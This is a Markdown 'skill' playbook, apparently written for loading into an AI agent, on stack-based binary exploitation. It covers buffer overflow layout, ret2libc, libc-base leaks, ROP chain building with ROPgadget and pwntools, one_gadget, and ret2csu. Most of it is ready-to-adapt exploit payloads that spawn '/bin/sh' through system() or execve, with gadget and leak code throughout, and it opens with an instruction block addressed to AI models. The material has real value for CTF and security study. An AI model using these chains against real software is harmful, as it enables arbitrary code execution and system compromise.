For other original section numbers, use the [entry index](../SKILL.md#references).


# SKILL: Stack Overflow & ROP — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert stack-based exploitation techniques. Covers classic buffer overflow, return-to-libc, ROP chain construction, ret2csu, ret2dlresolve, SROP, stack pivoting, and canary bypass. Distilled from ctf-wiki advanced-rop, real-world CVEs, and CTF competition patterns. Base models often miss the nuance of gadget selection under constrained conditions.

## 0. RELATED ROUTING

- [format-string-exploitation](../../format-string-exploitation/SKILL.md) — leak canary/libc/PIE base via format string before triggering overflow
- [binary-protection-bypass](../../binary-protection-bypass/SKILL.md) — systematic bypass of NX, ASLR, PIE, canary, RELRO
- [arbitrary-write-to-rce](../../arbitrary-write-to-rce/SKILL.md) — convert a write primitive (GOT, hooks, vtable) into code execution
- [heap-exploitation](../../heap-exploitation/SKILL.md) — when the vulnerability is in heap rather than stack

### Advanced Reference

Load [ROP_ADVANCED_TECHNIQUES.md](../ROP_ADVANCED_TECHNIQUES.md) when you need:
- Blind ROP (BROP) methodology against remote services without binary
- ret2vdso for ASLR bypass on 32-bit systems
- Partial overwrite techniques for PIE bypass
- JOP / COP alternative code-reuse paradigms

---

## 1. STACK LAYOUT FUNDAMENTALS

```
High Address
┌─────────────────────┐
│   ...  (caller)     │
├─────────────────────┤
│   Return Address    │  ← overwrite target (EIP/RIP control)
├─────────────────────┤
│   Saved EBP/RBP     │  ← overwrite for stack pivoting
├─────────────────────┤
│   Canary (if enabled)│
├─────────────────────┤
│   Local Variables    │  ← buffer starts here
├─────────────────────┤
│   ...               │
└─────────────────────┘
Low Address
```

| Element | x86 (32-bit) | x86-64 (64-bit) |
|---|---|---|
| Return address size | 4 bytes | 8 bytes |
| Saved frame pointer | 4 bytes (EBP) | 8 bytes (RBP) |
| Canary size | 4 bytes | 8 bytes |
| Calling convention | args on stack | RDI, RSI, RDX, RCX, R8, R9 then stack |
| Syscall instruction | `int 0x80` | `syscall` |

---

## 2. RETURN-TO-LIBC

When NX is enabled (stack not executable), redirect execution to libc functions.

### Classic ret2libc (32-bit)

```python
payload = b'A' * offset
payload += p32(system_addr)
payload += p32(exit_addr)      # fake return address for system()
payload += p32(binsh_addr)     # arg1: "/bin/sh"
```

### ret2libc (64-bit) — Need Gadgets for Arguments

```python
pop_rdi = elf_base + 0x401234  # pop rdi; ret
payload = b'A' * offset
payload += p64(pop_rdi)
payload += p64(binsh_addr)
payload += p64(system_addr)
```

### Libc Base Leak Methods

| Method | Technique | When |
|---|---|---|
| puts@plt(puts@GOT) | Leak resolved libc address | GOT already resolved, puts in PLT |
| write@plt(1, read@GOT, 8) | Leak via write syscall | write available |
| printf("%s", GOT_entry) | Leak via format string | printf controllable |
| Partial overwrite | Overwrite low bytes of return to reach leak gadget | PIE enabled, known last 12 bits |

```python
# Typical leak pattern
rop = b'A' * offset
rop += p64(pop_rdi) + p64(elf.got['puts'])
rop += p64(elf.plt['puts'])
rop += p64(main_addr)  # return to main for second payload

io.sendline(rop)
leak = u64(io.recvline().strip().ljust(8, b'\x00'))
libc_base = leak - libc.symbols['puts']
```

### one_gadget — Single Gadget RCE

```bash
$ one_gadget /path/to/libc.so.6
0x4f3d5  execve("/bin/sh", rsp+0x40, environ)
  constraints: rsp & 0xf == 0, rcx == NULL
0x4f432  execve("/bin/sh", rsp+0x40, environ)
  constraints: [rsp+0x40] == NULL
```

Constraints must be satisfied — check register/stack state before using.

---

## 3. ROP CHAIN CONSTRUCTION

### Tool Comparison

| Tool | Strength | Command |
|---|---|---|
| ROPgadget | Comprehensive search, chain generation | `ROPgadget --binary elf --ropchain` |
| ropper | Semantic search, JOP/COP support | `ropper -f elf --search "pop rdi"` |
| pwntools ROP | Automated chain building | `rop = ROP(elf); rop.call('system', ['/bin/sh'])` |
| xrop | Fast gadget search | `xrop -r elf` |

### Essential Gadget Patterns

| Purpose | Gadget | Use Case |
|---|---|---|
| Set RDI (arg1) | `pop rdi; ret` | Most function calls |
| Set RSI (arg2) | `pop rsi; pop r15; ret` | Two-arg functions |
| Set RDX (arg3) | `pop rdx; ret` (rare) | Three-arg functions, use ret2csu |
| Syscall | `syscall; ret` | Direct syscall invocation |
| Stack pivot | `leave; ret` | Move RSP to controlled buffer |
| Align stack | `ret` (single ret gadget) | Fix 16-byte alignment for movaps |

**x86-64 stack alignment**: `system()` and other libc functions use `movaps` which requires RSP % 16 == 0. Insert an extra `ret` gadget before the call if alignment is off.

---

## 4. ret2csu — Universal 3-Argument Control

`__libc_csu_init` exists in nearly all dynamically linked ELF binaries and provides controlled calls with up to 3 arguments.

```nasm
; Gadget 1 (csu_init + 0x3a): pop registers
pop rbx     ; 0
pop rbp     ; 1
pop r12     ; call target (function pointer address)
pop r13     ; arg3 (rdx)
pop r14     ; arg2 (rsi)
pop r15     ; arg1 (edi = r15d)
ret

; Gadget 2 (csu_init + 0x20): controlled call
mov rdx, r13
mov rsi, r14
mov edi, r15d    ; NOTE: only sets edi (32-bit), not full rdi
call [r12 + rbx*8]
add rbx, 1
cmp rbp, rbx
jne <loop>
; falls through to gadget 1 again
```

**Key constraints**: r12 must point to a **pointer** to the target function (e.g., GOT entry), not the function address directly. Set `rbx=0`, `rbp=1` to skip the loop.

---

